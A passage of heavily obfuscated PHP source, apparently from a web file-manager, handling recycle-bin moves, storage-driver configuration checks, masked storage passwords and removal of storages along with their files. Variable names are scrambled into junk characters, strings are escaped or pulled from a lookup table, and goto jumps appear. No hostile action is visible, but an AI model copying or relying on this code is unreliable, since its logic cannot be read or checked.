$this->recycleMove($Ñ¼¹¡ŸŒ, 0); if ($Ö×ƒÇâ¶[$ ¼³„¥Û[497]] == $ ¼³„¥Û[91]) { $•‚Äû˜ = array($ ¼³„¥Û[669] => array($ ¼³„¥Û[629], $Ö×ƒÇâ¶[$ ¼³„¥Û[598]] . $Ñ¼¹¡ŸŒ . $ ¼³„¥Û[630])); $¡­»×Ÿâ->where($•‚Äû˜)->setField($ ¼³„¥Û[517], 0); $this->restoreFolderChildren($Ñ¼¹¡ŸŒ, $½—¬ˆÇ); } $this->where(array($ ¼³„¥Û[194] => $Ñ¼¹¡ŸŒ))->delete(); $¡­»×Ÿâ->folderSizeReset($Ö×ƒÇâ¶[$ ¼³„¥Û[193]]); $—ßÙÆ¯É[] = $Ö×ƒÇâ¶[$ ¼³„¥Û[193]]; if ($Ö×ƒÇâ¶[$ ¼³„¥Û[497]] == $ ¼³„¥Û[91]) { $—ßÙÆ¯É[] = $Ñ¼¹¡ŸŒ; } $¡­»×Ÿâ->lockMoveEnd($Ñ¼¹¡ŸŒ); } $¡­»×Ÿâ->updateModifyTime($—ßÙÆ¯É); } private function restoreFolderChildren($«†šõ, $»—ßä¯) { $ã«òš«€ =& $_SERVER[´‹ô¯Œ]; $½šÙÎ„¢ = Model($ã«òš«€[1445]); $’°õ³Øœ = array($ã«òš«€[194] => array($ã«òš«€[7], array())); foreach ($»—ßä¯ as $ˆ½’àõã) { if ($ˆ½’àõã == $«†šõ) { continue; } if (!$½šÙÎ„¢->isParentOf($«†šõ, $ˆ½’àõã)) { continue; } $ù§ú¸ş§ = $½šÙÎ„¢->sourceInfo($ˆ½’àõã); if ($ù§ú¸ş§[$ã«òš«€[497]] == $ã«òš«€[91]) { $’°õ³Øœ[] = array($ã«òš«€[669] => array($ã«òš«€[629], $ù§ú¸ş§[$ã«òš«€[598]] . $ˆ½’àõã . $ã«òš«€[630])); } else { $’°õ³Øœ[$ã«òš«€[194]][1][] = $ˆ½’àõã; } } if (!$’°õ³Øœ[$ã«òš«€[194]][1]) { unset($’°õ³Øœ[$ã«òš«€[194]]); } if (!$’°õ³Øœ) { return; } if (is_array($’°õ³Øœ[$ã«òš«€[194]]) && is_array($’°õ³Øœ[$ã«òš«€[194]][1])) { $’°õ³Øœ[$ã«òš«€[194]][1] = array_unique($’°õ³Øœ[$ã«òš«€[194]][1]); } $’°õ³Øœ[$ã«òš«€[1092]] = $ã«òš«€[2099]; $½šÙÎ„¢->where($’°õ³Øœ)->setField($ã«òš«€[517], 1); } private function recycleMove($¸Ûóú ê, $ŒñÇù« = 1) { $öœ‰µ·ç =& $_SERVER[´‹ô¯Œ]; $ç¾İÍÌ¶ = Model($öœ‰µ·ç[1445]); $İ—á³œû = Model($öœ‰µ·ç[2328]); $èÔº‰ü = array($öœ‰µ·ç[194] => $¸Ûóú ê); if ($ŒñÇù«) { $ç¾İÍÌ¶->where($èÔº‰ü)->setField($öœ‰µ·ç[517], 1); $İ—á³œû->eventRecycle($¸Ûóú ê, $öœ‰µ·ç[2329]); } else { $‹‰¤ÁË³ = $ç¾İÍÌ¶->where($èÔº‰ü)->find(); $±Æ›ù„Ç = $‹‰¤ÁË³[$öœ‰µ·ç[497]] == $öœ‰µ·ç[91]; $Ìì÷ğ€ó = $ç¾İÍÌ¶->fileNameAuto($‹‰¤ÁË³[$öœ‰µ·ç[193]], $‹‰¤ÁË³[$öœ‰µ·ç[32]], REPEAT_RENAME_FOLDER, $±Æ›ù„Ç); if ($Ìì÷ğ€ó != $‹‰¤ÁË³[$öœ‰µ·ç[32]]) { $ç¾İÍÌ¶->rename($¸Ûóú ê, $Ìì÷ğ€ó); } $ç¾İÍÌ¶->where($èÔº‰ü)->setField($öœ‰µ·ç[517], 0); $İ—á³œû->eventRecycle($¸Ûóú ê, $öœ‰µ·ç[2330]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\163\x6f\165\x72\143\145\123\x65\143\162\145\x74\x4c\151\x73\x74"; public $field = array("\163\157\165\162\143\145\111\104", "\x74\171\x70\145\111\x44", "\x63\x72\145\141\x74\145\x55\x73\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\x73\x74\x6f\162\x61\147\145\x4c\x69\163\164"; public $field = array("\x6e\141\155\x65", "\x73\151\x7a\x65\115\x61\170", "\x73\171\x73\x74\145\155", "\144\145\x66\x61\x75\x6c\164", "\144\162\151\166\x65\162", "\x63\x6f\156\146\x69\x67"); public function listData($ÃÕ¸»¨í = false, $ÕãˆÛ· = "\x6d\157\x64\151\146\171\124\x69\155\145", $ê“šÒÈÓ = false) { $ş†óÚ€  =& $_SERVER[´‹ô¯Œ]; $ÕÄÒäº = parent::listData($ÃÕ¸»¨í, $ÕãˆÛ·, $ê“šÒÈÓ); if ($ÃÕ¸»¨í) { return $ÕÄÒäº; } $å…Àæö = array(); if ($GLOBALS[$ş†óÚ€ [2331]]) { $å…Àæö = $this->ioSizeUseGet(array_to_keyvalue($ÕÄÒäº, $ş†óÚ€ [12], $ş†óÚ€ [487])); } foreach ($ÕÄÒäº as $×·íú–æ => $ş‘±ùé) { unset($ÕÄÒäº[$×·íú–æ][$ş†óÚ€ [6]]); $ÕÄÒäº[$×·íú–æ][$ş†óÚ€ [1985]] = isset($å…Àæö[$ş‘±ùé[$ş†óÚ€ [487]]]) ? $å…Àæö[$ş‘±ùé[$ş†óÚ€ [487]]] : 0; } return $ÕÄÒäº; } public function ioSizeUseGet($ñ é÷¦) { $º‡¶ï°Š =& $_SERVER[´‹ô¯Œ]; if (!$ñ é÷¦) { return array(); } $ú§‘÷°ˆ = $º‡¶ï°Š[2332] . implode($º‡¶ï°Š[50], $ñ é÷¦); $ÍŠçÉ«© = Cache::get($ú§‘÷°ˆ); if ($ÍŠçÉ«©) { return $ÍŠçÉ«©; } $ªãª²×¿ = array($º‡¶ï°Š[909] => $º‡¶ï°Š[487], $º‡¶ï°Š[2333] => $º‡¶ï°Š[79]); $®Äúõ = array($º‡¶ï°Š[909] => array($º‡¶ï°Š[7], $ñ é÷¦)); $ÍŠçÉ«© = Model($º‡¶ï°Š[877])->field($ªãª²×¿)->where($®Äúõ)->group($º‡¶ï°Š[909])->select(); $ÍŠçÉ«© = array_to_keyvalue($ÍŠçÉ«©, $º‡¶ï°Š[487], $º‡¶ï°Š[79]); Cache::set($ú§‘÷°ˆ, $ÍŠçÉ«©, 600); return $ÍŠçÉ«©; } public function getConfig($“ôÇˆÔ‡) { $ö˜¡·Ó‰ = parent::listData($“ôÇˆÔ‡); $œ‹©÷Ô¬ = _get($ö˜¡·Ó‰, $_SERVER[´‹ô¯Œ][6], array()); if ($œ‹©÷Ô¬ && !is_array($œ‹©÷Ô¬)) { $œ‹©÷Ô¬ = json_decode($œ‹©÷Ô¬, !0); } return $œ‹©÷Ô¬; } public function update($àØßùËâ, $Ë€ÙåÃ) { $çÓİÇª‚ =& $_SERVER[´‹ô¯Œ]; $‡«ûŸ©¨ = $Ë€ÙåÃ[$çÓİÇª‚[32]]; $¡ÂÌ––› = array_to_keyvalue(parent::listData(), $çÓİÇª‚[32]); if (isset($¡ÂÌ––›[$‡«ûŸ©¨]) && $¡ÂÌ––›[$‡«ûŸ©¨][$çÓİÇª‚[487]] != $àØßùËâ) { return !1; } $this->checkPwd($àØßùËâ, $Ë€ÙåÃ); if (isset($Ë€ÙåÃ[$çÓİÇª‚[2334]]) && $Ë€ÙåÃ[$çÓİÇª‚[2334]] == $çÓİÇª‚[91]) { $this->checkConfig($Ë€ÙåÃ); } unset($Ë€ÙåÃ[$çÓİÇª‚[2334]]); $Éóæ¢ù× = parent::update($àØßùËâ, $Ë€ÙåÃ); if ($Éóæ¢ù× && $Ë€ÙåÃ[$çÓİÇª‚[37]]) { foreach ($¡ÂÌ––› as $ŞŠòŠŸ) { if ($ŞŠòŠŸ[$çÓİÇª‚[37]] && $ŞŠòŠŸ[$çÓİÇª‚[487]] != $àØßùËâ) { parent::update($ŞŠòŠŸ[$çÓİÇª‚[487]], array($çÓİÇª‚[37] => 0)); } } $this->updateBackup($àØßùËâ, $¡ÂÌ––›); } return $Éóæ¢ù×; } public function add($¦Óúºş•) { $°ïã´›÷ =& $_SERVER[´‹ô¯Œ]; $çÜ£àôû = array_to_keyvalue(parent::listData(), $°ïã´›÷[32]); if (isset($çÜ£àôû[$¦Óúºş•[$°ïã´›÷[32]]])) { return !1; } $this->checkConfig($¦Óúºş•); $˜Éà„£ı = parent::insert($¦Óúºş•); if ($˜Éà„£ı && $¦Óúºş•[$°ïã´›÷[37]]) { foreach ($çÜ£àôû as $±Ê ùòñ) { if ($±Ê ùòñ[$°ïã´›÷[37]]) { parent::update($±Ê ùòñ[$°ïã´›÷[487]], array($°ïã´›÷[37] => 0)); } } $this->updateBackup($˜Éà„£ı, $çÜ£àôû); } return $˜Éà„£ı; } public function updateBackup($Î¯‡ƒâ–, $ †´²¬ï) { $É³ê–š· =& $_SERVER[´‹ô¯Œ]; if ($Î¯‡ƒâ– == $É³ê–š·[91]) { return; } $è®ë¿¶ = Model($É³ê–š·[834])->config(); $¾Ë’ª¥® = $è®ë¿¶[$É³ê–š·[838]]; if ($è®ë¿¶[$É³ê–š·[1765]] != $É³ê–š·[91] || $¾Ë’ª¥® == $Î¯‡ƒâ–) { return; } if ($¾Ë’ª¥® != $É³ê–š·[91]) { $»™‘²¯ä = array(); foreach ($ †´²¬ï as $åºÎÅì) { if ($Î¯‡ƒâ– == $åºÎÅì[$É³ê–š·[487]]) { continue; } $»™‘²¯ä[] = $åºÎÅì[$É³ê–š·[487]]; } if ($»™‘²¯ä && in_array($¾Ë’ª¥®, $»™‘²¯ä)) { return; } } $É¿ªõ¼„ = Model($É³ê–š·[856])->get($É³ê–š·[863]); $É¿ªõ¼„ = json_decode($É¿ªõ¼„, !0); if (!$É¿ªõ¼„) { return; } $É¿ªõ¼„[$É³ê–š·[838]] = $Î¯‡ƒâ–; Model($É³ê–š·[856])->set(array($É³ê–š·[863] => $É¿ªõ¼„)); } public function checkPwd($ŞÅğ±™¬, &$ûîõÆ© ) { $İüéÙÈã =& $_SERVER[´‹ô¯Œ]; if (empty($ûîõÆ© [$İüéÙÈã[6]])) { return; } $¼­“­íæ = $ûîõÆ© [$İüéÙÈã[6]]; if (!is_array($¼­“­íæ)) { $¼­“­íæ = json_decode($¼­“­íæ, !0); } $çÎç²½Ö = $İüéÙÈã[12]; $ÅÒ¯Ò… = array($İüéÙÈã[2335], $İüéÙÈã[2336], $İüéÙÈã[981]); foreach ($ÅÒ¯Ò… as $„ˆ¼ğïü) { if (isset($¼­“­íæ[$„ˆ¼ğïü])) { $çÎç²½Ö = $„ˆ¼ğïü; break; } } if (!$çÎç²½Ö) { return; } $”»Ğ‡Š¦ = $this->getConfig($ŞÅğ±™¬); $­Š¦Åß¦ = $”»Ğ‡Š¦[$çÎç²½Ö]; $Ñ›İ×ğÔ = $¼­“­íæ[$çÎç²½Ö]; if ($Ñ›İ×ğÔ == str_repeat($İüéÙÈã[223], strlen($­Š¦Åß¦))) { $¼­“­íæ[$çÎç²½Ö] = $­Š¦Åß¦; $ûîõÆ© [$İüéÙÈã[6]] = json_encode($¼­“­íæ); } else { if ($Ñ›İ×ğÔ != $­Š¦Åß¦) { $ûîõÆ© [$İüéÙÈã[2334]] = $İüéÙÈã[91]; } } } public function checkConfig(&$øÇšüô¾, $ˆšÒ­‚Ù = false) { $¨ı¶Ó»ı =& $_SERVER[´‹ô¯Œ]; $ŠùÔÔÆî = strtolower($øÇšüô¾[$¨ı¶Ó»ı[98]]); $õÆşßƒ® = $øÇšüô¾[$¨ı¶Ó»ı[6]]; if (!is_array($õÆşßƒ®)) { $õÆşßƒ® = json_decode($õÆşßƒ®, !0); } foreach ($õÆşßƒ® as $°¹‡©¹† => $Ó¡¥Ò¯§) { if (is_string($Ó¡¥Ò¯§)) { $õÆşßƒ®[$°¹‡©¹†] = trim($Ó¡¥Ò¯§); } } $õÆşßƒ®[$¨ı¶Ó»ı[2337]] = rand_string(6); $¶öš÷¨ = $GLOBALS[$¨ı¶Ó»ı[6]][$¨ı¶Ó»ı[92]][$¨ı¶Ó»ı[917]]; $Œ¤Ù”è = isset($¶öš÷¨[$ŠùÔÔÆî]) ? $¶öš÷¨[$ŠùÔÔÆî] : ucfirst($ŠùÔÔÆî); $Í¡öúãˆ = $¨ı¶Ó»ı[77] . $Œ¤Ù”è; if (!$Œ¤Ù”è || !class_exists($Í¡öúãˆ)) { if ($ˆšÒ­‚Ù) { return LNG($¨ı¶Ó»ı[2338]); } write_log(array($¨ı¶Ó»ı[2339], $øÇšüô¾, get_caller_info()), $¨ı¶Ó»ı[216]); show_json(LNG($¨ı¶Ó»ı[2338]), !1, $øÇšüô¾); } $µ Ëı¸ = new $Í¡öúãˆ($õÆşßƒ®); $ÉÊÉãÃÜ = rtrim($õÆşßƒ®[$¨ı¶Ó»ı[1279]], $¨ı¶Ó»ı[8]) . $¨ı¶Ó»ı[8]; if (in_array($ŠùÔÔÆî, $µ Ëı¸->objectDriver)) { try { if (!$µ Ëı¸->isBucketCors() && !$µ Ëı¸->setBucketCors()) { $Ó¯“Ó£ = LNG($¨ı¶Ó»ı[2340]); $Ó¯“Ó£ .= $¨ı¶Ó»ı[2341] . LNG($¨ı¶Ó»ı[2342]); } } catch (Exception $ïÏşææ) { $Ó¯“Ó£ = $ïÏşææ->getMessage(); } if (isset($Ó¯“Ó£)) { return $this->_parseError($Ó¯“Ó£, $ŠùÔÔÆî, $ˆšÒ­‚Ù); } if ($ŠùÔÔÆî == $¨ı¶Ó»ı[68] && !$µ Ëı¸->checkRegion()) { return $this->_parseError(LNG($¨ı¶Ó»ı[2343]), $ŠùÔÔÆî, $ˆšÒ­‚Ù); } } else { if ($ŠùÔÔÆî == $¨ı¶Ó»ı[2344]) { if ($µ Ëı¸->ftpPath) { $™¤±ÉåÄ = trim($ÉÊÉãÃÜ, $¨ı¶Ó»ı[8]); if (stripos($™¤±ÉåÄ, trim($µ Ëı¸->ftpPath, $¨ı¶Ó»ı[8])) !== 0) { $ÉÊÉãÃÜ = $µ Ëı¸->ftpPath . $¨ı¶Ó»ı[8] . ($™¤±ÉåÄ ? $™¤±ÉåÄ . $¨ı¶Ó»ı[8] : $¨ı¶Ó»ı[12]); } } } } $®¡çô¡š = $µ Ëı¸->getPath($ÉÊÉãÃÜ . $¨ı¶Ó»ı[1283]); try { if ($ŠùÔÔÆî == $¨ı¶Ó»ı[109]) { $µ Ëı¸->mkdir($ÉÊÉãÃÜ); } $ğÎ¹¹šœ = $µ Ëı¸->mkfile($®¡çô¡š); if (!$ğÎ¹¹šœ) { $Ó¯“Ó£ = LNG($¨ı¶Ó»ı[2340]); } } catch (Exception $ïÏşææ) { $Ó¯“Ó£ = $ïÏşææ->getMessage(); } if (isset($Ó¯“Ó£)) { return $this->_parseError($Ó¯“Ó£, $ŠùÔÔÆî, $ˆšÒ­‚Ù); } $õÆşßƒ®[$¨ı¶Ó»ı[1279]] = $ÉÊÉãÃÜ; $øÇšüô¾[$¨ı¶Ó»ı[6]] = json_encode($õÆşßƒ®); $øÇšüô¾[$¨ı¶Ó»ı[98]] = $Œ¤Ù”è; return !0; } private function _parseError($Ó¬úß‹, $ùÂïÙ³İ, $ú¸µÍë‘ = false) { $Ë‘úª¡š =& $_SERVER[´‹ô¯Œ]; if ($ùÂïÙ³İ == $Ë‘úª¡š[68] && stripos($Ó¬úß‹, $Ë‘úª¡š[2345])) { $®Ë·°È = explode($Ë‘úª¡š[10], $Ó¬úß‹); $Å‡¸ÎÆ‰ = isset($®Ë·°È[1]) ? $®Ë·°È[1] : $Ë‘úª¡š[12]; $†…¦Í®ó = array($Ë‘úª¡š[2346] => LNG($Ë‘úª¡š[2347]), $Ë‘úª¡š[2348] => LNG($Ë‘úª¡š[2349])); if (isset($†…¦Í®ó[$Å‡¸ÎÆ‰])) { $Ó¬úß‹ = $†…¦Í®ó[$Å‡¸ÎÆ‰]; } } if (stripos($Ó¬úß‹, $Ë‘úª¡š[2350]) === 0) { $¤ºÅÇŞ = strpos($Ó¬úß‹, $Ë‘úª¡š[178]); if ($¤ºÅÇŞ === !1) { $¤ºÅÇŞ = strpos($Ó¬úß‹, $Ë‘úª¡š[4]); } if ($¤ºÅÇŞ !== !1) { $Ó¬úß‹ = substr($Ó¬úß‹, $¤ºÅÇŞ + 1); } } $Ó¬úß‹ = LNG($Ë‘úª¡š[1286]) . $Ó¬úß‹; if ($ú¸µÍë‘) { return $Ó¬úß‹; } show_json($Ó¬úß‹, !1); } public function driverListSystem() { $‚–ùøàä =& $_SERVER[´‹ô¯Œ]; $Èì‘ç… = parent::listData(); $¿¡™Ú‚Õ = array(); foreach ($Èì‘ç… as $Ô€ê•ˆİ) { unset($Ô€ê•ˆİ[$‚–ùøàä[234]], $Ô€ê•ˆİ[$‚–ùøàä[88]]); if (!is_array($Ô€ê•ˆİ[$‚–ùøàä[6]])) { $Ô€ê•ˆİ[$‚–ùøàä[6]] = json_decode($Ô€ê•ˆİ[$‚–ùøàä[6]], !0); } $¿¡™Ú‚Õ[] = $Ô€ê•ˆİ; } return $¿¡™Ú‚Õ; } public function defaultDriver() { $ºĞ£¸û‚ =& $_SERVER[´‹ô¯Œ]; $Óš§¥¥¬ = parent::listData(); $ÂÊ–«ı = array_filter_by_field($Óš§¥¥¬, $ºĞ£¸û‚[37], 1); $ÂÊ–«ı = $ÂÊ–«ı[0]; if (!$ÂÊ–«ı) { return array(); } if (!is_array($ÂÊ–«ı[$ºĞ£¸û‚[6]])) { $ÂÊ–«ı[$ºĞ£¸û‚[6]] = json_decode($ÂÊ–«ı[$ºĞ£¸û‚[6]], !0); } return $ÂÊ–«ı; } public function driverInfo($Ä¼Àû¬ô) { $ûÀãš˜  =& $_SERVER[´‹ô¯Œ]; $ãöÙ—øú = array_to_keyvalue(parent::listData(), $ûÀãš˜ [487]); if (!isset($ãöÙ—øú[$Ä¼Àû¬ô])) { return !1; } $ŸùË”¨ = $ãöÙ—øú[$Ä¼Àû¬ô]; if (!is_array($ŸùË”¨[$ûÀãš˜ [6]])) { $ŸùË”¨[$ûÀãš˜ [6]] = json_decode($ŸùË”¨[$ûÀãš˜ [6]], !0); } return $ŸùË”¨; } public function remove($¨£®ÖÚ) { $this->removeShareItems($¨£®ÖÚ); return parent::remove($¨£®ÖÚ); } public function removeWithFile($“ä¼ö‡‹, $öèŞ„·¢, $’ùøˆó‹, $÷ÓöÀó· = false) { $­ìŒÍÁô =& $_SERVER[´‹ô¯Œ]; $üâí‚Ìœ = array($­ìŒÍÁô[909] => $“ä¼ö‡‹); $ç»È„Ğ÷ = Model($­ìŒÍÁô[558])->where($üâí‚Ìœ)->count(); $›Âò½Áµ = Model($­ìŒÍÁô[558])->where($üâí‚Ìœ)->sum($­ìŒÍÁô[79]); $†Õ÷ıº = $öèŞ„·¢ . $­ìŒÍÁô[2351] . $“ä¼ö‡‹; $²˜Ÿºó­ = LNG($öèŞ„·¢ == $­ìŒÍÁô[637] ? $­ìŒÍÁô[2352] : $­ìŒÍÁô[2353]); $ˆÆñÅÚÜ = new TaskFileTransfer($†Õ÷ıº, $­ìŒÍÁô[216], $ç»È„Ğ÷, $²˜Ÿºó­ . $­ìŒÍÁô[465] . $’ùøˆó‹[$­ìŒÍÁô[32]] . $­ìŒÍÁô[215] . $“ä¼ö‡‹); $ˆÆñÅÚÜ->task[$­ìŒÍÁô[849]] = (double) $›Âò½Áµ; $ï„»Î÷È = KodIO::defaultDriver(); $Îùƒ˜Ì„ = $ï„»Î÷È[$­ìŒÍÁô[487]]; $èíïŒ‰Ò = $Ö¨èçŠ¨ = $£İºÜ²Ÿ = array(); $ÙÉ”¥âİ = Model($­ìŒÍÁô[233])->where($üâí‚Ìœ)->field($­ìŒÍÁô[2354])->select(); foreach ($ÙÉ”¥âİ as $†º­”±Ê) { $½üĞŞÑÃ = $†º­”±Ê[$­ìŒÍÁô[555]]; if ($÷ÓöÀó·) { $Ö¨èçŠ¨[] = $½üĞŞÑÃ; continue; } $ùÃ¥ª¼¾ = $†º­”±Ê[$­ìŒÍÁô[87]]; $«”âšÇâ = get_path_father($ùÃ¥ª¼¾); $£İºÜ²Ÿ[] = $«”âšÇâ; $«”âšÇâ = str_replace("\173\151\x6f\x3a{$“ä¼ö‡‹}\x7d\x2f", "\173\x69\157\x3a{$Îùƒ˜Ì„}\175\57", $«”âšÇâ); if (!IO::exist($ùÃ¥ª¼¾)) { $èíïŒ‰Ò[] = $½üĞŞÑÃ; $ˆÆñÅÚÜ->updateFileEnd($†º­”±Ê[$­ìŒÍÁô[32]], $†º­”±Ê[$­ìŒÍÁô[79]]); write_log($­ìŒÍÁô[2355] . $ùÃ¥ª¼¾, $­ìŒÍÁô[1928]); continue; } $Ú»Ñ„‘ = IO::move($ùÃ¥ª¼¾, $«”âšÇâ, REPEAT_RENAME); if (!$Ú»Ñ„‘) { $Ö¨èçŠ¨[] = $½üĞŞÑÃ; $ˆÆñÅÚÜ->updateFileEnd($†º­”±Ê[$­ìŒÍÁô[32]], $†º­”±Ê[$­ìŒÍÁô[79]]); write_log($­ìŒÍÁô[2356] . $ùÃ¥ª¼¾, $­ìŒÍÁô[1928]); continue; } $üâí‚Ìœ = array($­ìŒÍÁô[555] => $½üĞŞÑÃ); $¬ÄÔˆøÔ = array($­ìŒÍÁô[909] => $Îùƒ˜Ì„, $­ìŒÍÁô[87] => $Ú»Ñ„‘); Model($­ìŒÍÁô[233])->where($üâí‚Ìœ)->save($¬ÄÔˆøÔ); } $»‚Å¨à = $ˆÆñÅÚÜ->task; if (!$÷ÓöÀó·) { Cache::set($†Õ÷ıº, $»‚Å¨à); } $ˆÆñÅÚÜ->end(); $èíïŒ‰Ò = array_unique($èíïŒ‰Ò); $Ö¨èçŠ¨ = array_unique($Ö¨èçŠ¨); if (!$÷ÓöÀó· && ($èíïŒ‰Ò || $Ö¨èçŠ¨)) { $¾ÈáÈì = array(); if ($èíïŒ‰Ò) { $¾ÈáÈì[] = sprintf(LNG($­ìŒÍÁô[2357]), count($èíïŒ‰Ò)); } if ($Ö¨èçŠ¨) { $¾ÈáÈì[] = sprintf(LNG($­ìŒÍÁô[2358]), count($Ö¨èçŠ¨)); } $¾ÈáÈì = sprintf(LNG($­ìŒÍÁô[2359]), implode($­ìŒÍÁô[2360], $¾ÈáÈì)) . $­ìŒÍÁô[2361] . date($­ìŒÍÁô[2362]) . $­ìŒÍÁô[2363]; if ($öèŞ„·¢ == $­ìŒÍÁô[1965]) { $¾ÈáÈì .= $­ìŒÍÁô[2364] . LNG($­ìŒÍÁô[2365]); } else { $¾ÈáÈì = LNG($­ìŒÍÁô[2366]) . $­ìŒÍÁô[2367] . $¾ÈáÈì; } $»‚Å¨à[$­ìŒÍÁô[1281]] = $¾ÈáÈì; Cache::set($†Õ÷ıº, $»‚Å¨à); unset($’ùøˆó‹[$­ìŒÍÁô[6]]); $ò–¶ĞÒ­ = array($­ìŒÍÁô[487] => $“ä¼ö‡‹, $­ìŒÍÁô[2236] => $­ìŒÍÁô[637], $­ìŒÍÁô[32] => $’ùøˆó‹[$­ìŒÍÁô[32]], $­ìŒÍÁô[98] => $’ùøˆó‹[$­ìŒÍÁô[98]]); Hook::trigger($­ìŒÍÁô[1807], array($­ìŒÍÁô[1304] => $ò–¶ĞÒ­, $­ìŒÍÁô[1314] => !0)); show_json($¾ÈáÈì, !1, 100111); } if ($öèŞ„·¢ == $­ìŒÍÁô[637]) { return !0; } if ($èíïŒ‰Ò || $Ö¨èçŠ¨) { $ŸÑƒı…Ï = array_merge($èíïŒ‰Ò, $Ö¨èçŠ¨); $ŸÑƒı…Ï = array_filter(array_unique($ŸÑƒı…Ï)); $this->removeByFileID($ŸÑƒı…Ï); } if ($£İºÜ²Ÿ) { $£İºÜ²Ÿ = array_filter(array_unique($£İºÜ²Ÿ)); foreach ($£İºÜ²Ÿ as $ùÃ¥ª¼¾) { $¬‰¶ÑÄæ = IO::has($ùÃ¥ª¼¾, !0); if (!$¬‰¶ÑÄæ[$­ìŒÍÁô[242]] && !$¬‰¶ÑÄæ[$­ìŒÍÁô[243]]) { IO::remove($ùÃ¥ª¼¾); } } } return $this->remove($“ä¼ö‡‹); } private function removeByFileID($òøªø™¨ = array()) { $ì³ÓİÃ¸ =& $_SERVER[´‹ô¯Œ]; if (empty($òøªø™¨)) { return; } $ê¦Ü“É§ = array($ì³ÓİÃ¸[555] => array($ì³ÓİÃ¸[7], $òøªø™¨)); $¢‘¾ÍÑõ = Model($ì³ÓİÃ¸[1445])->where($ê¦Ü“É§)->field($ì³ÓİÃ¸[2312])->select(); if (!$¢‘¾ÍÑõ) { return Model($ì³ÓİÃ¸[558])->remove($òøªø™¨); } $¢‘¾ÍÑõ = array_to_keyvalue($¢‘¾ÍÑõ, $ì³ÓİÃ¸[194], $ì³ÓİÃ¸[555]); foreach ($¢‘¾ÍÑõ as $èÃâ§çŞ => $¶µääÙ¢) { Model($ì³ÓİÃ¸[916])->removeNow($èÃâ§çŞ, !1); } $°»¨¦àı = array_diff($òøªø™¨, array_unique(array_values($¢‘¾ÍÑõ))); if ($°»¨¦àı) { return Model($ì³ÓİÃ¸[558])->remove($°»¨¦àı); } } private function removeShareItems($Õ„Î¨¶¦) { $¨œÃ½õ =& $_SERVER[´‹ô¯Œ]; $è€«Ü×ı = "\173\x69\157\72{$Õ„Î¨¶¦}\x7d\57"; $¯å„š”Ö = array($¨œÃ½õ[194] => 0, $¨œÃ½õ[1274] => array($¨œÃ½õ[462], "{$è€«Ü×ı}\x25")); $š«ñÊåŠ = Model($¨œÃ½õ[1976])->where($¯å„š”Ö)->field($¨œÃ½õ[682])->select(); if (empty($š«ñÊåŠ)) { return; } $«İ«ï¿Æ = array_to_keyvalue($š«ñÊåŠ, $¨œÃ½õ[12], $¨œÃ½õ[682]); Model($¨œÃ½õ[681])->remove($«İ«ï¿Æ); } } goto C¼Ş‘ §Ú; aÆê¹“µ‡À: class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\162\x63\145"; protected $tableMeta = array("\164\141\142\x6c\x65\116\141\155\145" => "\151\x6f\x5f\163\x6f\165\162\x63\x65\137\155\x65\x74\x61", "\155\x65\x74\141\x46\x69\145\154\144" => "\x73\157\165\x72\x63\145\111\x44"); protected $dataAuto = array(array("\x6d\157\x64\x69\x66\171\124\x69\155\145", "\x74\x69\x6d\x65", "\151\x6e\163\145\x72\x74", "\146\165\x6e\x63\164\x69\x6f\x6e"), array("\143\x72\145\x61\164\145\x54\x69\x6d\145", "\x74\151\155\145", "\151\156\163\x65\162\x74", "\x66\x75\156\143\164\x69\157\x6e"), array("\x76\x69\145\x77\124\151\155\145", "\x74\x69\155\145", "\x69\156\163\145\x72\164", "\x66\165\x6e\143\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($’±ã—†Ğ) { return $this->listSource(array($_SERVER[´‹ô¯Œ][489] => $’±ã—†Ğ)); } public function typeName($·é×ûÄ) { static $ëÂÖá¬û = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\x65\155", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\147\162\x6f\x75\x70"); return $ëÂÖá¬û[$·é×ûÄ . $_SERVER[´‹ô¯Œ][12]]; } public function sourceListInfo($¹¹”©Í, $Ö¬¡ò˜™ = false) { $©åéš¿Õ =& $_SERVER[´‹ô¯Œ]; $¹¹”©Í = $¹¹”©Í ? $¹¹”©Í : array(); $¹¹”©Í = array_filter(array_unique($¹¹”©Í)); if (!$¹¹”©Í) { return array(); } $ğâŞ«°Ç = $this->where(array($©åéš¿Õ[194] => array($©åéš¿Õ[7], $¹¹”©Í)))->select(); $this->_listDataApply($ğâŞ«°Ç, $Ö¬¡ò˜™); return array_to_keyvalue($ğâŞ«°Ç, $©åéš¿Õ[194]); } public function pathInfoFilter(&$Ñ¶üÌãã) { $ÇãÜó¾À =& $_SERVER[´‹ô¯Œ]; static $§ñË§Öº = false; static $¸¬´®§ = false; static $°–ß¸¶ß = false; if (!$§ñË§Öº) { $”ƒ€¡Ü“ = $ÇãÜó¾À[490]; $”ƒ€¡Ü“ .= $ÇãÜó¾À[491]; $”ƒ€¡Ü“ .= $ÇãÜó¾À[492]; $¸¸»º‰ = $ÇãÜó¾À[493]; $ÚõÕ°—Ó = explode($ÇãÜó¾À[50], $¸¸»º‰); $§ñË§Öº = explode($ÇãÜó¾À[50], $”ƒ€¡Ü“); $¸¬´®§ = array(); foreach ($§ñË§Öº as $‘´íú×£) { if (in_array($‘´íú×£, $ÚõÕ°—Ó)) { continue; } $¸¬´®§[] = $‘´íú×£; } $°–ß¸¶ß = explode($ÇãÜó¾À[50], $ÇãÜó¾À[494]); } foreach ($°–ß¸¶ß as $êÚ‰’ğ) { if (isset($Ñ¶üÌãã[$êÚ‰’ğ])) { $Ñ¶üÌãã[$êÚ‰’ğ] = intval($Ñ¶üÌãã[$êÚ‰’ğ]); } } $Ñ¶üÌãã[$ÇãÜó¾À[87]] = $ÇãÜó¾À[495] . $Ñ¶üÌãã[$ÇãÜó¾À[194]] . $ÇãÜó¾À[496]; $Ñ¶üÌãã[$ÇãÜó¾À[33]] = $Ñ¶üÌãã[$ÇãÜó¾À[497]] == 1 ? $ÇãÜó¾À[78] : $ÇãÜó¾À[233]; $Ñ¶üÌãã[$ÇãÜó¾À[191]] = $this->typeName($Ñ¶üÌãã[$ÇãÜó¾À[191]]); if 